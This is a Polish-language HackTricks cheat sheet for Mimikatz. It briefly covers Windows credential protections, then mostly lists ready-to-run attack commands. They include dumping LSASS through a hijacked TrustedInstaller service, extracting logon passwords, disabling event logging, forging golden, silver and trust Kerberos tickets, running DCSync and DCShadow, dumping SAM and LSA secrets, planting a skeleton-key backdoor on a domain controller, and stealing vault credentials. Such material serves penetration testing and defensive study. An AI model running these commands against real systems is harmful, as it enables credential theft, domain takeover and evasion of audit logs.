# Mimikatz

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:

{% embed url="https://academy.8ksec.io/" %}


**Ta strona opiera się na jednej z [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Sprawdź oryginał, aby uzyskać więcej informacji!

## LM i hasła w postaci czystego tekstu w pamięci

Od Windows 8.1 i Windows Server 2012 R2 wprowadzono znaczące środki w celu ochrony przed kradzieżą poświadczeń:

- **Hasła LM i hasła w postaci czystego tekstu** nie są już przechowywane w pamięci, aby zwiększyć bezpieczeństwo. Należy skonfigurować określony klucz rejestru, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, z wartością DWORD `0`, aby wyłączyć uwierzytelnianie Digest, zapewniając, że hasła w "czystym tekście" nie są buforowane w LSASS.

- **Ochrona LSA** została wprowadzona, aby chronić proces Local Security Authority (LSA) przed nieautoryzowanym odczytem pamięci i wstrzykiwaniem kodu. Osiąga się to poprzez oznaczenie LSASS jako chronionego procesu. Aktywacja Ochrony LSA obejmuje:
1. Modyfikację rejestru w _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_, ustawiając `RunAsPPL` na `dword:00000001`.
2. Wdrożenie obiektu zasad grupy (GPO), który wymusza tę zmianę rejestru na zarządzanych urządzeniach.

Pomimo tych zabezpieczeń, narzędzia takie jak Mimikatz mogą omijać Ochronę LSA, używając określonych sterowników, chociaż takie działania prawdopodobnie zostaną zarejestrowane w dziennikach zdarzeń.

### Przeciwdziałanie usunięciu SeDebugPrivilege

Administratorzy zazwyczaj mają SeDebugPrivilege, co umożliwia im debugowanie programów. To uprawnienie można ograniczyć, aby zapobiec nieautoryzowanym zrzutom pamięci, co jest powszechną techniką stosowaną przez atakujących do wydobywania poświadczeń z pamięci. Jednak nawet po usunięciu tego uprawnienia, konto TrustedInstaller nadal może wykonywać zrzuty pamięci, używając dostosowanej konfiguracji usługi:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
To pozwala na zrzut pamięci `lsass.exe` do pliku, który następnie można analizować na innym systemie w celu wyodrębnienia poświadczeń:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Opcje Mimikatz

Manipulacja dziennikami zdarzeń w Mimikatz obejmuje dwa główne działania: czyszczenie dzienników zdarzeń i łatanie usługi zdarzeń, aby zapobiec rejestrowaniu nowych zdarzeń. Poniżej znajdują się polecenia do wykonania tych działań:

#### Czyszczenie dzienników zdarzeń

- **Polecenie**: To działanie ma na celu usunięcie dzienników zdarzeń, co utrudnia śledzenie złośliwych działań.
- Mimikatz nie zapewnia bezpośredniego polecenia w swojej standardowej dokumentacji do czyszczenia dzienników zdarzeń bezpośrednio za pomocą wiersza poleceń. Jednak manipulacja dziennikami zdarzeń zazwyczaj obejmuje użycie narzędzi systemowych lub skryptów poza Mimikatz do czyszczenia konkretnych dzienników (np. używając PowerShell lub Podglądu zdarzeń systemu Windows).

#### Funkcja eksperymentalna: Łatanie usługi zdarzeń

- **Polecenie**: `event::drop`
- To eksperymentalne polecenie ma na celu modyfikację zachowania usługi rejestrowania zdarzeń, skutecznie zapobiegając rejestrowaniu nowych zdarzeń.
- Przykład: `mimikatz "privilege::debug" "event::drop" exit`

- Polecenie `privilege::debug` zapewnia, że Mimikatz działa z niezbędnymi uprawnieniami do modyfikacji usług systemowych.
- Polecenie `event::drop` następnie łata usługę rejestrowania zdarzeń.


### Ataki na bilety Kerberos

### Tworzenie Złotego Biletu

Złoty Bilet umożliwia impersonację z dostępem w całej domenie. Kluczowe polecenie i parametry:

- Polecenie: `kerberos::golden`
- Parametry:
- `/domain`: Nazwa domeny.
- `/sid`: Identyfikator zabezpieczeń (SID) domeny.
- `/user`: Nazwa użytkownika do impersonacji.
- `/krbtgt`: Hash NTLM konta usługi KDC domeny.
- `/ptt`: Bezpośrednio wstrzykuje bilet do pamięci.
- `/ticket`: Zapisuje bilet do późniejszego użycia.

Przykład:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Tworzenie Srebrnego Biletu

Srebrne Bilety dają dostęp do konkretnych usług. Kluczowe polecenie i parametry:

- Polecenie: Podobne do Złotego Biletu, ale celuje w konkretne usługi.
- Parametry:
- `/service`: Usługa, którą należy celować (np. cifs, http).
- Inne parametry podobne do Złotego Biletu.

Przykład:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Tworzenie Zaufanego Biletu

Zaufane Bilety są używane do uzyskiwania dostępu do zasobów w różnych domenach, wykorzystując relacje zaufania. Kluczowe polecenie i parametry:

- Polecenie: Podobne do Złotego Biletu, ale dla relacji zaufania.
- Parametry:
- `/target`: FQDN docelowej domeny.
- `/rc4`: Hash NTLM dla konta zaufania.

Przykład:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Dodatkowe polecenia Kerberos

- **Wyświetlanie biletów**:
- Polecenie: `kerberos::list`
- Wyświetla wszystkie bilety Kerberos dla bieżącej sesji użytkownika.

- **Przekazywanie pamięci podręcznej**:
- Polecenie: `kerberos::ptc`
- Wstrzykuje bilety Kerberos z plików pamięci podręcznej.
- Przykład: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Przekazywanie biletu**:
- Polecenie: `kerberos::ptt`
- Umożliwia użycie biletu Kerberos w innej sesji.
- Przykład: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Usuwanie biletów**:
- Polecenie: `kerberos::purge`
- Czyści wszystkie bilety Kerberos z sesji.
- Przydatne przed użyciem poleceń manipulacji biletami, aby uniknąć konfliktów.


### Manipulacja Active Directory

- **DCShadow**: Tymczasowo sprawia, że maszyna działa jako DC do manipulacji obiektami AD.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Naśladuje DC, aby żądać danych o hasłach.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Dostęp do poświadczeń

- **LSADUMP::LSA**: Ekstrahuje poświadczenia z LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Podszywa się pod DC, używając danych o haśle konta komputerowego.
- *Brak konkretnego polecenia dla NetSync w oryginalnym kontekście.*

- **LSADUMP::SAM**: Uzyskuje dostęp do lokalnej bazy danych SAM.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Deszyfruje sekrety przechowywane w rejestrze.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Ustawia nowe hasło NTLM dla użytkownika.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Pobiera informacje o uwierzytelnianiu zaufania.
- `mimikatz "lsadump::trust" exit`

### Różne

- **MISC::Skeleton**: Wstrzykuje tylne wejście do LSASS na DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Eskalacja uprawnień

- **PRIVILEGE::Backup**: Uzyskuje prawa do tworzenia kopii zapasowych.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Uzyskuje uprawnienia debugowania.
- `mimikatz "privilege::debug" exit`

### Zrzut poświadczeń

- **SEKURLSA::LogonPasswords**: Wyświetla poświadczenia dla zalogowanych użytkowników.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Ekstrahuje bilety Kerberos z pamięci.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipulacja SID i tokenami

- **SID::add/modify**: Zmienia SID i SIDHistory.
- Dodaj: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Zmodyfikuj: *Brak konkretnego polecenia dla modyfikacji w oryginalnym kontekście.*

- **TOKEN::Elevate**: Podszywa się pod tokeny.
- `mimikatz "token::elevate /domainadmin" exit`

### Usługi terminalowe

- **TS::MultiRDP**: Umożliwia wiele sesji RDP.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Wyświetla sesje TS/RDP.
- *Brak konkretnego polecenia dla TS::Sessions w oryginalnym kontekście.*

### Skarbiec

- Ekstrahuje hasła z Windows Vault.
- `mimikatz "vault::cred /patch" exit`


<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Zgłębiaj swoją wiedzę w **Bezpieczeństwie Mobilnym** z 8kSec Academy. Opanuj bezpieczeństwo iOS i Androida dzięki naszym kursom w trybie samodzielnym i uzyskaj certyfikat:

{% embed url="https://academy.8ksec.io/" %}

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
